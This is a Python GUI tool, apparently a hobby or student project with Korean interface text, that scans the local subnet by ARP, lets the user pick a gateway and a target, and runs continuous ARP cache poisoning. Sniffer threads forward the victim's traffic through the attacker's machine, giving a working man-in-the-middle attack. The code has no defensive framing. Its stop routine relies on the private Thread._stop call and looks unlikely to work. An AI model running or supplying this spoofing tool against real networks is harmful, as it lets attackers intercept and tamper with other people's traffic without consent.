from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QTableWidget, \
    QTableWidgetItem, QAbstractItemView, QMessageBox
import netifaces
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, arping
import psutil
import socket
import threading

mac_list = []
ip_list = []
hostname_list = []
all_list = []

my_mac = ""
gateway_ip = ""
gateway_mac = ""
target_ip = ""
target_mac = ""


def get_hostname(ip_address):
    try:
        return socket.gethostbyaddr(ip_address)[0]
    except:
        return "unknown"


def get_my_ip():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("www.google.com", 443))
    return sock.getsockname()[0]


def list_clear():
    mac_list.clear()
    ip_list.clear()
    hostname_list.clear()
    all_list.clear()


def get_address_list():
    ans, unans = arping(".".join(get_my_ip().split(".")[:3]) + ".0/24")
    list_clear()
    for s, r in ans:
        mac_list.append(r[Ether].src)
        ip_list.append(r[ARP].psrc)
        hostname_list.append(get_hostname(r[ARP].psrc))

    for h, i, m in zip(hostname_list, ip_list, mac_list):
        all_list.append([h, i, m])
    return all_list


def get_my_mac():
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:  # MAC 주소가 있는 경우
                if 'Ethernet' in iface:
                    net_if_addrs = psutil.net_if_addrs()
                    mac_address = None
                    for interface_name, interface_addresses in net_if_addrs.items():
                        for address in interface_addresses:
                            if address.family == psutil.AF_LINK:
                                mac_address = address.address
                                break
                        if mac_address is not None:
                            break
                    return mac_address

                elif 'Wi-Fi' in iface:
                    interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
                    return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']


class ScanThread(threading.Thread):
    def __init__(self, table):
        threading.Thread.__init__(self)
        self.table = table


    def run(self):
        self.table.clearContents()
        self.table.setRowCount(0)
        rows = get_address_list()
        for row in rows:
            self.table.insertRow(self.table.rowCount())
            for col in range(3):
                self.table.setItem(self.table.rowCount() - 1, col, QTableWidgetItem(str(row[col])))


class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setGeometry(700, 300, 500, 300)
        self.packet_reply_thread = None
        self.packet_request_thread = None
        self.poison_thread = None
        self.table = QTableWidget()
        self.table.setColumnCount(3)
        self.table.setHorizontalHeaderLabels(['Hostname', 'IP', 'MAC'])
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)

        self.scan_button = QPushButton('Scan')
        self.scan_button.clicked.connect(self.scan)

        self.gateway_button = QPushButton('Gateway')
        self.gateway_button.clicked.connect(self.get_gateway)

        self.target_button = QPushButton('Target')
        self.target_button.clicked.connect(self.get_target)

        self.start_spoofing_button = QPushButton('Start Spoofing')
        self.start_spoofing_button.clicked.connect(self.start_spoofing)

        self.stop_spoofing_button = QPushButton('Stop Spoofing')
        self.stop_spoofing_button.clicked.connect(self.stop_spoofing)

        # Set up layout
        layout = QVBoxLayout()
        layout.addWidget(self.table)
        layout.addWidget(self.scan_button)
        layout.addWidget(self.gateway_button)
        layout.addWidget(self.target_button)
        layout.addWidget(self.start_spoofing_button)
        layout.addWidget(self.stop_spoofing_button)

        self.setLayout(layout)

    def scan(self):
        scan_thread = ScanThread(self.table)
        scan_thread.start()

    def get_gateway(self):
        global gateway_ip, gateway_mac
        selected_rows = self.table.selectionModel().selectedRows()

        if selected_rows:
            selected_row = selected_rows[0].row()

            gateway_ip = self.table.item(selected_row, 1).text()
            gateway_mac = self.table.item(selected_row, 2).text()

            print(f"Gateway IP: {gateway_ip}, MAC: {gateway_mac}")
        else:
            if not gateway_ip:
                QMessageBox.about(self, '경고', '지정된 Gateway가 없습니다.')

    def get_target(self):
        global target_ip, target_mac
        selected_rows = self.table.selectionModel().selectedRows()

        if selected_rows:
            selected_row = selected_rows[0].row()

            target_ip = self.table.item(selected_row, 1).text()
            target_mac = self.table.item(selected_row, 2).text()

            print(f"Target IP: {target_ip}, MAC: {target_mac}")
        else:
            if not target_ip:
                QMessageBox.about(self, '경고', '지정된 Target이 없습니다.')

    def start_spoofing(self):
        def target_arp_cache_poisoning():

            arp = ARP(op=2, hwsrc=get_my_mac(), psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
            send(arp)

        def ap_arp_cache_poisoning():
            arp = ARP(op=2, hwsrc=get_my_mac(), psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip)
            send(arp)

        def poison():
            while True:
                target_arp_cache_poisoning()
                ap_arp_cache_poisoning()
                time.sleep(2)

        def packet_request():
            sniff(
                filter="ip src " + target_ip + " and ether dst " + get_my_mac() + " and ether src " + target_mac,
                prn=send_packet_to_gateway)

        def packet_reply():
            # while True:
            sniff(
                filter="ether src " + gateway_mac + " and ip dst " + target_ip + " and ether dst " + get_my_mac(),
                prn=send_packet_to_target)

        def send_packet_to_gateway(packet):
            packet[Ether].src = get_my_mac()
            packet[Ether].dst = gateway_mac
            sendp(packet)

        def send_packet_to_target(packet):
            packet[Ether].src = get_my_mac()
            packet[Ether].dst = target_mac
            sendp(packet)

        self.poison_thread = threading.Thread(target=poison)
        self.poison_thread.start()

        self.packet_request_thread = threading.Thread(target=packet_request)
        self.packet_request_thread.start()

        self.packet_reply_thread = threading.Thread(target=packet_reply)
        self.packet_reply_thread.start()

    def stop_spoofing(self):

        self.packet_reply_thread._stop()
        self.packet_request_thread._stop()
        self.poison_thread._stop()

        print("Spoofing stopped")

if __name__ == '__main__':
    app = QApplication([])
    window = MainWindow()
    window.show()
    app.exec_()
